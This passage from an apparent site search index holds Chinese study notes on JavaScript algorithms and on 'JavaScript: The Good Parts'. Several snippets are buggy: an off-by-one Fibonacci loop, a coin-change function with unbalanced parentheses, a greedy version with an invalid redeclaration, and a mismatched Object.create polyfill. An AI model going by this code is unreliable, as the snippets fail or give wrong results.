\u7b97\u6cd5\u8865\u5145","text":""},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_21","title":"\u9012\u5f52","text":"<p>\u9012\u5f52\uff1a\u628a\u4e00\u4e2a\u590d\u6742\u95ee\u9898\u8f6c\u5316\u6210\u591a\u6b65\u91cd\u590d\u8ba1\u7b97\u3002\u53ef\u4ee5\u4e00\u4e2a\u51fd\u6570\u8c03\u7528\u81ea\u5df1\uff0c\u53ef\u4ee5\u4e24\u4e2a\u51fd\u6570\u4e92\u76f8\u8c03\u7528\u3002</p> <p>\u5728ES6\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528\u5c3e\u8c03\u7528\uff08\u51fd\u6570\u6700\u540e\u4e00\u53e5\u4ee3\u7801\u8c03\u7528\u51fd\u6570\uff09\u8fdb\u884c\u4f18\u5316\u3002\u5176\u4ed6\u8bed\u8a00\u4e2d\u9012\u5f52\u6027\u80fd\u4e0d\u597d\uff0cES6\u901a\u8fc7\u5c3e\u9012\u5f52\u53ef\u4ee5\u4f18\u5316\u6027\u80fd\u3002 \u6ce8\u610f\uff1a\u9012\u5f52\u9700\u8981\u6709\u8fb9\u754c\u6761\u4ef6\uff0c\u907f\u514d\u65e0\u9650\u9012\u5f52\u9020\u6210\u6d4f\u89c8\u5668\u5185\u5b58\u6ea2\u51fa\uff08stack overflow error\uff09\u3002\u4f8b\u5982\u6590\u6ce2\u90a3\u5951\u6570\u5217\uff1a</p> <pre><code>function fibonacci(n) {\n  if (n === 1 || n === 2) return 1;\n  return fibonacci(n - 1) + fibonacci(n - 2);\n}\n\n// \u975e\u9012\u5f52\u5199\u6cd5\nfunction fib(num) {\n  let result = 1;\n  let n1 = 1, n2 = 1;\n  for (let i = 3; i &lt; num; i++) {\n    result = n1 + n2;\n    n1 = n2;\n    n2 = result;\n  }\n  return result;\n}\n</code></pre> <p>\u9012\u5f52\u4ee3\u7801\u91cf\u5f88\u5c11\uff0c\u66f4\u5bb9\u6613\u7406\u89e3\uff1b\u96be\u70b9\u662f\u8fb9\u754c\u6761\u4ef6\u548c\u5f00\u59cb\u6761\u4ef6\u3002</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_22","title":"\u8fed\u4ee3","text":"<p>\u51fd\u6570\u7684\u9012\u5f52\u53ef\u80fd\u5360\u7528\u5927\u91cf\u5185\u5b58\u3002\u6bcf\u6b21\u8fdb\u884c\u9012\u5f52\uff0c\u90fd\u9700\u8981\u4e34\u65f6\u5b58\u50a8\u7236\u51fd\u6570\u7684\u8ba1\u7b97\u7ed3\u679c\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u4f1a\u9020\u6210\u5185\u5b58\u95ee\u9898\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fed\u4ee3\u6cd5\u89e3\u51b3\u3002</p> <p>\u9012\u5f52\u7c7b\u4f3c DFS\uff0c\u8fed\u4ee3\u7c7b\u4f3c BFS\u3002\u8fed\u4ee3\u4f7f\u7528\u4e00\u4e2a\u4e34\u65f6\u7684\u6808\u5b58\u50a8\u5f53\u65f6\u7684\u7ed3\u679c\uff0c\u6bcf\u6b21\u6267\u884c\u4e00\u6b21\u8ba1\u7b97\u540e\uff0c\u5224\u65ad\u5f53\u524d\u7ed3\u679c\u662f\u5426\u6ee1\u8db3\u6761\u4ef6\u3002</p> <p>\u9012\u5f52\u548c\u8fed\u4ee3\u53ef\u4ee5\u4e92\u76f8\u8f6c\u6362\u3002</p> <pre><code>let stack = [];\nwhile (stack.length &gt; 0) {\n  let curr = stack.pop();\n  let result = fn(curr);\n  if (result) {\n    stack.push(result);\n  }\n}\n</code></pre>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_23","title":"\u52a8\u6001\u89c4\u5212","text":"<p>\u5206\u800c\u6cbb\u4e4b\uff1a\u628a\u4e00\u4e2a\u590d\u6742\u7684\u95ee\u9898\u5206\u89e3\u6210\u5f88\u591a\u65e0\u5173\u8054\u7684\u5c0f\u95ee\u9898\uff08\u4f8b\u5982\u63a5\u96e8\u6c34\uff09\u3002</p> <p>\u52a8\u6001\u89c4\u5212\uff1a\u628a\u4e00\u4e2a\u590d\u6742\u7684\u95ee\u9898\u5206\u89e3\u6210\u5f88\u591a\u5173\u8054\u7684\u5c0f\u95ee\u9898\uff08\u8bc6\u522b\u5b50\u95ee\u9898\u548c\u8fb9\u754c\u6761\u4ef6\uff09\u4e0b\u9762\u662f\u5178\u578b\u95ee\u9898</p> <ul> <li> <p>\u80cc\u5305\u95ee\u9898:\u7ed9\u51fa\u4e00\u7ec4\u9879\u76ee\uff0c\u5404\u81ea\u6709\u503c\u548c\u5bb9\u91cf\uff0c\u76ee\u6807\u662f\u627e\u51fa\u603b\u503c\u6700\u5927\u7684\u9879\u76ee\u7684\u96c6\u5408\u3002\u8fd9\u4e2a \u95ee\u9898\u7684\u9650\u5236\u662f\uff0c\u603b\u5bb9\u91cf\u5fc5\u987b\u5c0f\u4e8e\u7b49\u4e8e\u201c\u80cc\u5305\u201d\u7684\u5bb9\u91cf\u3002</p> </li> <li> <p>\u6700\u957f\u516c\u5171\u5b50\u5e8f\u5217:\u627e\u51fa\u4e00\u7ec4\u5e8f\u5217\u7684\u6700\u957f\u516c\u5171\u5b50\u5e8f\u5217(\u53ef\u7531\u53e6\u4e00\u5e8f\u5217\u5220\u9664\u5143\u7d20\u4f46\u4e0d\u6539\u53d8\u4f59 \u4e0b\u5143\u7d20\u7684\u987a\u5e8f\u800c\u5f97\u5230)\u3002</p> </li> <li> <p>\u77e9\u9635\u94fe\u76f8\u4e58:\u7ed9\u51fa\u4e00\u7cfb\u5217\u77e9\u9635\uff0c\u76ee\u6807\u662f\u627e\u5230\u8fd9\u4e9b\u77e9\u9635\u76f8\u4e58\u7684\u6700\u9ad8\u6548\u529e\u6cd5(\u8ba1\u7b97\u6b21\u6570\u5c3d\u53ef \u80fd\u5c11)\u3002\u76f8\u4e58\u64cd\u4f5c\u4e0d\u4f1a\u8fdb\u884c\uff0c\u89e3\u51b3\u65b9\u6848\u662f\u627e\u5230\u8fd9\u4e9b\u77e9\u9635\u5404\u81ea\u76f8\u4e58\u7684\u987a\u5e8f\u3002</p> </li> <li> <p>\u786c\u5e01\u627e\u96f6:\u7ed9\u51fa\u9762\u989d\u4e3ad1...dn\u7684\u4e00\u5b9a\u6570\u91cf\u7684\u786c\u5e01\u548c\u8981\u627e\u96f6\u7684\u94b1\u6570\uff0c\u627e\u51fa\u6709\u591a\u5c11\u79cd\u627e\u96f6\u7684 \u65b9\u6cd5\u3002</p> </li> <li> <p>\u56fe\u7684\u5168\u6e90\u6700\u77ed\u8def\u5f84:\u5bf9\u6240\u6709\u9876\u70b9\u5bf9(u, v)\uff0c\u627e\u51fa\u4ece\u9876\u70b9u\u5230\u9876\u70b9v\u7684\u6700\u77ed\u8def\u5f84\u3002</p> </li> </ul>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_24","title":"\u6700\u5c11\u786c\u5e01\u627e\u96f6\u7b97\u6cd5","text":"<p>\u786c\u5e01\u627e\u96f6\u95ee\u9898\u662f\u7ed9\u51fa\u8981\u627e\u96f6\u7684\u94b1\u6570\uff0c\u4ee5\u53ca\u53ef \u7528\u7684\u786c\u5e01\u9762\u989dd1...dn\u53ca\u5176\u6570\u91cf\uff0c\u627e\u51fa\u6709\u591a\u5c11\u79cd\u627e\u96f6\u65b9\u6cd5\u3002</p> <p>\u6700\u5c11\u786c\u5e01\u627e\u96f6\u95ee\u9898\u662f\u7ed9\u51fa\u8981\u627e\u96f6\u7684\u94b1\u6570\uff0c \u4ee5\u53ca\u53ef\u7528\u7684\u786c\u5e01\u9762\u989dd1...dn\u53ca\u5176\u6570\u91cf\uff0c\u627e\u5230\u6240\u9700\u7684\u6700\u5c11\u7684\u786c\u5e01\u4e2a\u6570\uff08\u5c31\u662f\u4e0a\u9762\u786c\u5e01\u627e\u96f6\u7b97\u6cd5\u7ed3\u679c\u4e2d\uff0c\u786c\u5e01\u6700\u5c11\u7684\u4e00\u79cd\u7b97\u6cd5\uff09\u3002 </p> <p>\u4f8b\u5982\uff1a\u7f8e\u56fd\u6709\u4ee5\u4e0b\u9762\u989d(\u786c\u5e01):d1=1\uff0cd2=5\uff0cd3=10\uff0cd4=25\u3002 \u5982\u679c\u8981\u627e36\u7f8e\u5206\u7684\u96f6\u94b1\uff0c\u6211\u4eec\u53ef\u4ee5\u75281\u4e2a25\u7f8e\u5206\u30011\u4e2a10\u7f8e\u5206\u548c1\u4e2a\u4fbf\u58eb(1\u7f8e\u5206)\u3002 </p> <pre><code>function MinCoinChange(coins) {\n  let cache = {};\n  this.makeChange = (amount) =&gt; {\n    let me = this;\n    if (!amount) return [];\n    if (cache[amount]) return cache[amount];\n\n    let min = [], newMin, newAmount;\n    for (let i = 0; i &lt; coins.length; i++) {\n      let coin = coins[i];\n      newAmount = amount - coin;\n      if (newAmount &gt;= 0) {\n        // \u9012\u5f52\u83b7\u53d6\u6700\u5c0f\u503c\n        newMin = me.makeChange(newAmount);\n      }\n      if (newAmount &gt;=0 &amp;&amp; (newMin.length &lt; min.length - 1) || !min.length) &amp;&amp; (newMin.length || !newAmount)) {\n        min = [coin].concat(newMin);\n        console.log(min, amount);\n      }\n    }\n    return (cache[amount] = min);\n  }\n}\n</code></pre>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_25","title":"\u8d2a\u5fc3\u7b97\u6cd5","text":"<p>\u8d2a\u5fc3\u7b97\u6cd5\uff1a\u8ffd\u6c42\u6bcf\u4e00\u4e2a\u5c40\u90e8\u7684\u95ee\u9898\u7684\u6700\u4f18\u89e3\u3002\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u53ef\u4ee5\u83b7\u53d6\u6b63\u786e\u7684\u503c\uff0c\u5c11\u51fa\u60c5\u51b5\u4e0d\u662f\u6700\u4f18\u89e3\uff0c\u8fd9\u6837\u5199\u6027\u80fd\u5f88\u597d\u3002</p> <pre><code>function MinCoinChange(coins) {\n  let coins = coins;\n  // \u8fd9\u91cc\u7684coins\u662f\u4ece\u5c0f\u5230\u5927\u6392\u5e8f\u7684\uff0c\u7136\u540e\u4f9d\u6b21\u628a\u6700\u5927\u7684\u503c\u52a0\u5165\u5230total\u4e2d\uff0c\u7136\u540e\u628acoin\u5b58\u50a8\u5728change\u4e2d\n  this.makeChange = (amount) =&gt; {\n    let change = [];\n    let total = 0;\n    for (let i = coins.length; i &gt;= 0; i--) {\n      let coin = coins[i];\n      while (total + coin &lt;= amount) {\n        change.push(coin);\n        total += coin;\n      }\n    }\n    return change;\n  }\n}\n</code></pre> <p>\u5982\u679c\u662f [1, 5, 10, 25] target 36 \u53ef\u4ee5\u7b97\u5bf9\uff1b\u5982\u679c\u662f[1, 3, 4] target 6 \u5c31\u4f1a\u7b97\u9519</p> <p>\u5982\u679c\u5bf9\u7b97\u6cd5\u7cbe\u5ea6\u8981\u6c42\u4e0d\u9ad8\uff0c\u8d2a\u5fc3\u7b97\u6cd5\u53ef\u4ee5\u5728\u8f83\u597d\u7684\u65f6\u95f4\u5185\u8ba1\u7b97\u51fa\u53ef\u4ee5\u63a5\u53d7\u7684\u7b54\u6848\u3002</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#o_1","title":"\u5927O\u8868\u793a\u6cd5\u4e0e\u65f6\u95f4\u590d\u6742\u5ea6","text":"<p>\u5982\u679c\u7b97\u6cd5\u7684\u8ba1\u7b97\u65f6\u95f4\u548c\u4f20\u5165\u53c2\u6570\u5927\u5c0f\u65e0\u5173\uff0c\u5373\u7b97\u6cd5\u7684\u8017\u65f6\u662f\u4e00\u4e2a\u5e38\u6570\uff0c\u90a3\u4e48\u590d\u6742\u5ea6\u5c31\u662fO1</p> <pre><code>function add (a,b) {\n  return a + b;\n}\n</code></pre> <p>\u5982\u679c\u7b97\u6cd5\u7684\u8ba1\u7b97\u65f6\u95f4\u548c\u4f20\u5165\u7684\u6570\u7ec4\u7684\u53c2\u6570\u4e2a\u6570\u76f8\u7b49\uff0c\u90a3\u4e48\u5c31\u662fOn</p> <pre><code>function index(arr, target) {\n  for (let i = 0; i &lt; arr.length; i++) {\n    if (arr[i] === target) return i;\n  }\n  return -1;\n}\n</code></pre> <p>\u5982\u679c\u8ba1\u7b97\u65f6\u95f4\u548c\u6570\u7ec4\u7684\u53c2\u6570\u7684\u5e73\u65b9\u76f8\u7b49\uff0c\u5c31\u662fOn2\uff0c\u4f8b\u5982\u5192\u6ce1\u6392\u5e8f\u6cd5\u7684\u5185\u5faa\u73af*\u5916\u5faa\u73af</p> <p>\u5e38\u89c1\u7684\u7b97\u6cd5\u590d\u6742\u5ea6\u7684\u8ba1\u7b97</p>"},{"location":"other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/#_26","title":"\u7b97\u6cd5\u6bd4\u8d5b\u7f51\u7ad9","text":"<ul> <li> <p>UVa Online Judge(http://uva.onlinejudge.org/)  \u8fd9\u4e2a\u7f51\u7ad9\u5305\u542b\u4e86\u4e16\u754c\u5404\u5927\u8d5b\u4e8b\u7684\u9898\u76ee\uff0c \u5305\u62ec\u7531IBM\u8d5e\u52a9\u7684ACM\u56fd\u9645\u5927\u5b66\u751f\u7a0b\u5e8f\u7ade\u8d5b ICPC </p> </li> <li> <p>Sphere Online Judge(http://www.spoj.com/)  \u8fd9\u4e2a\u7f51\u7ad9\u548cUVa Online Judge\u5dee\u4e0d\u591a\uff0c\u4f46\u652f\u6301\u7528\u66f4\u591a\u8bed\u8a00\u89e3\u9898(\u5305\u62ecJavaScript)\u3002 </p> </li> <li> <p>CoderByte(http://coderbyte.com/)  \u8fd9\u4e2a\u7f51\u7ad9\u5305\u542b\u4e8674\u4e2a\u53ef\u4ee5\u7528JavaScript\u89e3\u7b54\u7684\u9898\u76ee(\u7b80 \u5355\u3001\u4e2d\u7b49\u96be\u5ea6\u548c\u975e\u5e38\u56f0\u96be)\u3002 </p> </li> <li> <p>Project Euler(https://projecteuler.net/)  \u8fd9\u4e2a\u7f51\u7ad9\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u6570\u5b66/\u8ba1\u7b97\u673a\u7684\u7f16\u7a0b\u9898\u76ee\u3002\u4f60\u6240\u8981\u505a\u7684\u5c31\u662f\u8f93\u5165\u90a3\u4e9b\u9898\u76ee\u7684\u7b54\u6848\uff0c\u4e0d\u8fc7\u6211\u4eec\u53ef\u4ee5\u7528\u7b97\u6cd5\u6765\u627e\u5230\u6b63\u786e\u7684\u89e3\u7b54\u3002 </p> </li> <li> <p>Hacker Rank(https://www.hackerrank.com)  \u8fd9\u4e2a\u7f51\u7ad9\u5305\u542b\u4e86263\u4e2a\u6311\u6218\uff0c\u5206\u4e3a16\u4e2a\u7c7b\u522b (\u53ef\u4ee5\u5e94\u7528\u672c\u4e66\u4e2d\u7684\u7b97\u6cd5\u548c\u66f4\u591a\u5176\u4ed6\u7b97\u6cd5)\u3002\u5b83\u4e5f\u652f\u6301JavaScript\u548c\u5176\u4ed6\u8bed\u8a00\u3002 </p> </li> <li> <p>Code Chef(http://www.codechef.com/)  \u8fd9\u4e2a\u7f51\u7ad9\u5305\u542b\u4e00\u4e9b\u9898\u76ee\uff0c\u5e76\u4f1a\u4e3e\u529e\u5728\u7ebf\u6bd4\u8d5b\u3002 </p> </li> <li> <p>Top Coder(http://www.topcoder.com/)  \u6b64\u7f51\u7ad9\u4f1a\u4e3e\u529e\u7b97\u6cd5\u8054\u8d5b\uff0c\u8fd9\u4e9b\u8054\u8d5b\u901a\u5e38\u7531NASA\u3001 Google\u3001Yahoo!\u3001Amazon\u548cFacebook\u8fd9\u6837\u7684\u516c\u53f8\u8d5e\u52a9\u3002\u53c2\u52a0\u5176\u4e2d\u4e00\u4e9b\u8d5b\u4e8b\uff0c\u4f60\u53ef\u4ee5\u83b7\u5f97 \u5230\u8d5e\u52a9\u516c\u53f8\u5de5\u4f5c\u7684\u673a\u4f1a\uff0c\u800c\u53c2\u4e0e\u53e6\u4e00\u4e9b\u8d5b\u4e8b\u4f1a\u8d62\u5f97\u5956\u91d1\u3002\u8fd9\u4e2a\u7f51\u7ad9\u4e5f\u63d0\u4f9b\u5f88\u68d2\u7684\u89e3\u9898\u548c \u7b97\u6cd5\u6559\u7a0b\u3002 </p> </li> </ul>"},{"location":"other/JS-the-good-parts/","title":"JS the good parts","text":""},{"location":"other/JS-the-good-parts/#js","title":"JS \u8bed\u8a00\u7cbe\u7cb9 \u8774\u8776\u4e66","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 21996  \u9605\u8bfb44\u5206\u949f</p> <p>\u4f5c\u8005\u7535\u5b50\u4e66\u7f51\u5740\uff1ahttps://www.crockford.com/books.html</p>"},{"location":"other/JS-the-good-parts/#_1","title":"\u7b2c\u4e00\u5f20 \u7cbe\u534e","text":"<p>JS \u8bed\u8a00\u7684\u7279\u6b8a\u6027\u9020\u6210\u4e86\u7cbe\u534e\u548c\u7cdf\u7c95\u5e76\u5b58</p>"},{"location":"other/JS-the-good-parts/#_2","title":"\u7b2c\u4e8c\u7ae0 \u8bed\u6cd5","text":"<pre><code>// page 18\nFunction.prototype.method = function (name, func) {\n  this.prototype[name] = func;\n  return this;\n}\n</code></pre>"},{"location":"other/JS-the-good-parts/#_3","title":"\u6ce8\u91ca","text":"<p>\u5728JS\u4e2d\u4f7f\u7528\u6ce8\u91ca\u6700\u597d\u4f7f\u7528//\u3002\u4e0d\u4f7f\u7528/**/\u7684\u5f62\u5f0f\u3002\u56e0\u4e3a\u6b63\u5219\u8868\u8fbe\u5f0f\u548c\u6ce8\u91ca\u53ef\u80fd\u53d1\u751f\u51b2\u7a81\u9020\u6210\u8bed\u6cd5\u9519\u8bef\u3002</p> <p>\u5728JS\u4e2dnumber\u5c31\u662f64\u4f4d\u7684\u6d6e\u70b9\u6570\uff0c\u6ca1\u6709int\u7684\u6982\u5ff5\u3002\u6240\u4ee5\u5728JS\u4e2d1.0 === 1</p> <p>\u6307\u6570\uff1a100 = = = 1e2 = = = 1 * 10 * 10</p> <p>\u5b57\u7b26\u4e32\u662f\u4e0d\u53ef\u53d8\u7684\uff1a\u5982\u679c\u4f7f\u7528+\u8fdb\u884c\u8fde\u63a5\uff0c\u90a3\u4e48\u662f\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5b57\u7b26\u4e32\uff08\u5e76\u4e0d\u662f\u5728\u539f\u6765\u7684\u57fa\u7840\u4e0a\u52a0\u4e00\u4e2a\u5b57\u7b26\uff09\u3002</p> <pre><code>'cat'.length === 3\n\nfor (let key in obj) {\n  if (obj.hasOwnProperty(key)) {\n    console.log(key);\n  }\n}\n</code></pre> <p>\u5224\u65ad\u5c5e\u6027\u540d\u6765\u81ea\u4e8e\u5bf9\u8c61\u7684\u6210\u5458\u8fd8\u662f\u539f\u578b\u94fe</p> <p>try-catch-throw \u8fd8\u662f\u4e0d\u719f\u7ec3</p> <p>typeof(null) =&gt; 'Object'</p> <p>\u5728JS\u4e2d%\u8868\u793a\u53d6\u4f59\u6570\u3002\u5f53\u4e24\u4e2a\u8fd0\u7b97\u6570\u90fd\u662f\u6b63\u6570\u548c\u6c42\u6a21\u8fd0\u7b97\u4e00\u81f4\uff0c\u4f46\u662f\u5b58\u5728\u8d1f\u6570\uff0c\u5c31\u51fa\u73b0\u4e0d\u4e00\u81f4\u7684\u60c5\u51b5\u3002</p>"},{"location":"other/JS-the-good-parts/#_4","title":"\u539f\u578b","text":"<p>\u516c\u7528\u7684\u51fd\u6570\u7684\u65b9\u6cd5\u53ef\u4ee5\u653e\u5728\u5bf9\u8c61\u7684\u539f\u578b\u4e2d\uff08\u5728es6\u4e2dreact\u4e2d\uff0c\u76f4\u63a5\u653e\u5728\u7ec4\u4ef6\u7684\u7c7b\u4e2d\uff0c\u4f5c\u4e3a\u7ec4\u4ef6\u7684\u65b9\u6cd5\u5b9e\u73b0\u590d\u7528\u6548\u679c\uff09\u3002\u79c1\u6709\u7684\u65b9\u6cd5\u5355\u72ec\u4f5c\u4e3a\u5bf9\u8c61\u7684\u65b9\u6cd5\u76f4\u63a5\u6dfb\u52a0\u5373\u53ef\u3002</p> <pre><code>if (typeof Object.beget !== 'function') {\n  Object.create = function(o) {\n    var F = function() {};\n    F.prototype = o;\n    return new F();\n  };\n}\n\nvar another = Object.create(stooge);\nanother.nickname = \"Moe\";\n</code></pre> <p>\u539f\u578b\u8fde\u63a5\u5728\u66f4\u65b0\u65f6\u662f\u4e0d\u8d77\u4f5c\u7528\u7684\u3002\u5f53\u6211\u4eec\u5bf9\u4e8e\u5bf9\u8c61\u4f5c\u51fa\u6539\u53d8\uff0c\u4e0d\u4f1a\u89e6\u53ca\u8be5\u5bf9\u8c61\u7684\u539f\u578b\uff1b</p> <p>hasOwnproperty \u4f1a\u68c0\u67e5\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u4e0d\u4f1a\u68c0\u67e5\u5bf9\u8c61\u539f\u578b\u94fe\u4e0a\u7684\u5c5e\u6027</p>"},{"location":"other/JS-the-good-parts/#_5","title":"\u7b2c\u4e09\u7ae0 \u5bf9\u8c61","text":""},{"location":"other/JS-the-good-parts/#_6","title":"\u5c5e\u6027\u59d4\u6258\uff08\u539f\u578b\u94fe\uff09","text":"<p>\u5982\u679c\u5c1d\u8bd5\u83b7\u53d6\u67d0\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\u503c\uff0c\u4f46\u662f\u8fd9\u4e2a\u5bf9\u8c61\u6ca1\u6709\u5bf9\u5e94\u7684\u5c5e\u6027\u540d\uff0c\u90a3\u4e48\u5c31\u4f1a\u53bb\u539f\u578b\u94fe\u4e2d\u9010\u5c42\u5bfb\u627e\u8fd9\u4e2a\u5c5e\u6027\u3002\u5982\u679c\u5230\u8fbe\u7ec8\u70b9\u7684Object.prototype\u6ca1\u6709\uff0c\u8fd4\u56de\u4e00\u4e2aundefined\u503c\u3002</p> <p>\u539f\u578b\u5173\u7cfb\u662f\u52a8\u6001\u7684\u5173\u7cfb\uff1a\u5982\u679c\u6211\u4eec\u7ed9\u4e00\u4e2a\u5bf9\u8c61\u6dfb\u52a0\u65b0\u7684\u5c5e\u6027\u5230\u539f\u578b\u4e2d\uff0c\u90a3\u4e48\u8be5\u5c5e\u6027\u4f1a\u5bf9\u6240\u6709\u57fa\u4e8e\u8be5\u539f\u578b\u521b\u5efa\u7684\u5bf9\u8c61\u53ef\u89c1\uff1b</p>"},{"location":"other/JS-the-good-parts/#reflection","title":"\u53cd\u5c04reflection","text":"<p>\u68c0\u67e5\u4e00\u4e2a\u5bf9\u8c61\u5177\u6709\u67d0\u4e2a\u5c5e\u6027\u662f\u5f88\u5bb9\u6613\u7684\u4e8b\u60c5\uff1b\u4f7f\u7528typeof\u53ef\u4ee5\u83b7\u53d6\u5bf9\u8c61\u7684\u5c5e\u6027\u7684\u6570\u636e\u7c7b\u578b\u3002</p> <p>\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\uff1atypeof\u5bf9\u4e8e\u539f\u578b\u4e2d\u7684\u4efb\u4f55\u5c5e\u6027\u90fd\u4f1a\u4ea7\u751f\u503c\uff08\u4f8b\u5982construction \u4ea7\u751f function\uff09 \u89e3\u51b3\u65b9\u6848\uff1a1.\u8ba9\u7a0b\u5e8f\u68c0\u67e5\u5e76\u4e22\u6389\u51fd\u6570\u7684\u5c5e\u6027\uff1b2.\u4f7f\u7528hasOwnProperty\u65b9\u6cd5\uff0c\u5c06\u5bf9\u8c61\u4e2d\u72ec\u6709\u7684\u5c5e\u6027\u8fd4\u56de\uff0c\u539f\u578b\u94fe\u4e2d\u65b9\u6cd5\u4e0d\u4f1a\u68c0\u67e5\u3002</p>"},{"location":"other/JS-the-good-parts/#enumeration","title":"\u679a\u4e3e enumeration \u5faa\u73af\u904d\u5386\u5bf9\u8c61\u4e2d\u7684\u5c5e\u6027","text":"<p>\u904d\u5386\u5bf9\u8c61\u4e2d\u7684\u5c5e\u6027\u5206\u4e3a\u4e24\u79cd\u60c5\u51b5</p> <p>1.\u672a\u77e5\u5bf9\u8c61\u7684\u5c5e\u6027\u540d\uff1a\u4f7f\u7528for-in\u904d\u5386\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u4f7f\u7528typeof\u8fc7\u6ee4\u51fd\u6570\uff0c\u4f7f\u7528hasOwnProperty\u8fc7\u6ee4\u539f\u578b\u94fe\u7684\u90e8\u5206\u3002</p> <pre><code>for (let name in object) {\n  if(typeof object[name] !== 'function') {\n    console.log(name + ':' + object[name]);\n  }\n}\n</code></pre> <p>2.\u5df2\u77e5\u51fd\u6570\u7684\u5c5e\u6027\u540d\uff1a\u4f7f\u7528\u4e00\u4e2a\u6570\u7ec4\u5b58\u653e\u51fd\u6570\u7684\u5c5e\u6027\u540d\uff1b\u83b7\u53d6\u6570\u7ec4\u7684\u957f\u5ea6i\uff0c\u4f7f\u7528for\u904d\u5386\u5bf9\u8c61\u7684\u5c5e\u6027\u503c\u3002</p> <pre><code>let properties = ['name', 'age', 'sex'];\nfor (let i = 0; i &lt; properties.length; i++) {\n  console.log(properties[i] + \":\" + object[properties[i]]);\n}\n</code></pre> <p>\u53ef\u4ee5\u83b7\u53d6\u6b63\u786e\u987a\u5e8f\u7684\u5c5e\u6027\uff08\u4e0d\u9700\u8981\u8003\u8651\u539f\u578b\u94fe\u7684\u5c5e\u6027\uff09</p>"},{"location":"other/JS-the-good-parts/#delete","title":"\u5220\u9664\u5c5e\u6027 delete","text":"<p>\u5220\u9664\u5bf9\u8c61\u7684\u5c5e\u6027\uff1a\u5982\u679c\u5bf9\u8c61\u5177\u6709\u67d0\u4e2a\u5c5e\u6027\uff0c\u4f1a\u5220\u9664\u8fd9\u4e2a\u5c5e\u6027\u3002\u5220\u9664\u64cd\u4f5c\u4e0d\u4f1a\u89e6\u53ca\u539f\u578b\u94fe\u4e2d\u7684\u4efb\u4f55\u5bf9\u8c61\u53ca\u5c5e\u6027\uff1b\u5220\u9664\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u5982\u679c\u539f\u578b\u94fe\u4e2d\u8fd8\u6709\u8fd9\u4e2a\u5c5e\u6027\uff0c\u90a3\u4e48\u8fd8\u53ef\u4ee5\u83b7\u53d6\u8fd9\u4e2a\u5c5e\u6027\uff08\u539f\u578b\u94fe\u4e0a\u7684\u5c5e\u6027\uff09\uff1b</p> <p>\u51cf\u5c0f\u5168\u5c40\u53d8\u91cf\u7684\u6c61\u67d3\uff1a\u4f7f\u7528let \u521b\u5efa\u5c40\u90e8\u53d8\u91cf\u5728\u51fd\u6570\u4e2d\u3002\u4f7f\u7528\u95ed\u5305\u5f62\u5f0f\u5411\u5916\u66b4\u9732\u6709\u9650\u7684\u63a5\u53e3\u3002\u5c06\u5168\u5c40\u6027\u7684\u8d44\u6e90\u52a0\u8f7d\u5230\u4e00\u4e2a\u5bb9\u5668\u4e2d\uff0c\u8fd9\u6837\u4e00\u4e2a\u7a0b\u5e8f\u548c\u5176\u4ed6\u7a0b\u5e8f\u7684\u51b2\u7a81\u5c31\u4f1a\u964d\u4f4e\u3002</p>"},{"location":"other/JS-the-good-parts/#_7","title":"\u7b2c\u56db\u7ae0 \u51fd\u6570","text":"<p>\u51fd\u6570\u662f\u529f\u80fd\u5b9e\u73b0\u7684\u57fa\u672c\u5355\u5143\uff1b\u4e00\u4e2a\u51fd\u6570\u7684\u529f\u80fd\u5e94\u5f53\u7b80\u5355\uff1b\u7f16\u7a0b\u5c31\u662f\u628a\u4e00\u7ec4\u9700\u6c42\u5206\u89e3\u6210\u4e00\u7ec4\u51fd\u6570\u548c\u6570\u636e\u7ed3\u6784\u7684\u6280\u80fd\u3002\u907f\u514d\u5728\u4e00\u4e2a\u51fd\u6570\u5185\u90e8\u5b9e\u73b0\u591a\u4e2a\u529f\u80fd\u3002</p> <p>\u4f7f\u7528\u5b57\u9762\u91cf\u521b\u5efa\u7684\u51fd\u6570\u94fe\u63a5\u5230\u4e00\u4e2a Object.prototype \uff0c\u4f7f\u7528\u51fd\u6570\u8868\u8fbe\u5f0f\u521b\u5efa\u7684\u51fd\u6570\uff0c\u94fe\u63a5\u5230\u4e00\u4e2aFunction.prototype\uff0c\u6700\u7ec8\u901a\u8fc7\u539f\u578b\u94fe\u94fe\u63a5\u5230 Object.prototype.</p> <p>\u51fd\u6570\u5728\u521b\u5efa\u540e\uff0c\u4f1a\u5177\u6709\u4e00\u4e2aprototype\u5c5e\u6027\uff0c\u5b83\u7684\u503c\u5177\u6709\u4e00\u4e2aconstructor\u5c5e\u6027\u5c31\u662f\u8be5\u51fd\u6570\u7684\u5bf9\u8c61\u3002</p> 